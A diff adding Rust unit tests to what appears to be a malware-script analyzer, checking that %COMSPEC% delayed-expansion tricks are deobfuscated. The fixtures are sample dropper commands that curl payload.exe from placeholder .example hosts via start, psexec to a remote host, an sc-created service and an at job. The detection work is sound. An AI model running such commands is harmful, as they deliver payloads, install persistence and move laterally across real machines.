@@ -1506,6 +1506,41 @@ start payload.chm"#;
     }
 
     #[test]
+    fn comspec_cmd_child_preserves_delayed_expansion() {
+        let script = br#"%COMSPEC% /V:ON /c "set U=https://comspec-wrapper.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://comspec-wrapper.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "%COMSPEC% cmd child did not preserve delayed expansion: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn start_comspec_child_preserves_delayed_expansion() {
+        let script = br#"start "" /b %COMSPEC% /V:ON /c "set U=https://start-comspec.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://start-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "start %COMSPEC% child did not preserve delayed expansion: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn start_process_verb_runas_emits_self_elevation_trait() {
         // `Start-Process … -Verb RunAs` triggers UAC. Dropper families
         // (SKMBT, dropper.bat) use it to relaunch elevated. Surface as
@@ -2165,6 +2200,32 @@ move "%cmdDestination%" "%startupFolder%"
                     if tool == "psexec" && target_host == "target.example"
             )),
             "psexec slash-option lateral movement trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn psexec_replays_remote_comspec_child() {
+        let script = br#"psexec \\target.example -u admin -p pass %COMSPEC% /V:ON /c set U=https://psexec-comspec.example/payload.exe&&curl -o payload.exe !U!"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://psexec-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "psexec %COMSPEC% child command was not analyzed: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::LateralMovement { tool, target_host }
+                    if tool == "psexec" && target_host == "target.example"
+            )),
+            "psexec %COMSPEC% lateral movement trait missing: {:?}",
             report.traits
         );
     }
@@ -12720,6 +12781,33 @@ sc create UpdateSvc binPath= "cmd.exe /c curl -K curl.cfg -o payload.exe""#;
     }
 
     #[test]
+    fn sc_create_comspec_binpath_cmd_child_is_analyzed() {
+        let script = br#"sc create UpdateSvc binPath= "%COMSPEC% /V:ON /c set U=https://sc-comspec-binpath.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ServiceInstall { service_name, bin_path }
+                    if service_name == "UpdateSvc"
+                        && bin_path.contains("%COMSPEC% /V:ON /c set U=")
+            )),
+            "service install trait missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://sc-comspec-binpath.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "service %COMSPEC% binPath child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn remote_sc_create_binpath_cmd_child_is_analyzed() {
         let script = br#"sc \\target.example create UpdateSvc binPath= "cmd.exe /V:ON /c set U=https://remote-sc-binpath.example/payload.exe&&curl -o payload.exe !U!""#;
         let report = analyze(script, &Config::default());
@@ -12833,6 +12921,35 @@ at 23:59 cmd.exe /c curl -K curl.cfg -o payload.exe"#;
                     if tool == "at" && target_host == "target.example"
             )),
             "remote at scheduled command lateral movement missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn at_scheduled_comspec_cmd_child_is_analyzed() {
+        let script = br#"at 23:59 %COMSPEC% /V:ON /c set U=https://at-comspec.example/payload.exe&&curl -o payload.exe !U!"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, value_name, command }
+                    if hive == "AtJob"
+                        && key == "23:59"
+                        && value_name == "command"
+                        && command.contains("cmd.exe /V:ON /c set U=")
+            )),
+            "at scheduled command persistence missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://at-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "at scheduled %COMSPEC% child was not analyzed: {:?}",
             report.traits
         );
     }
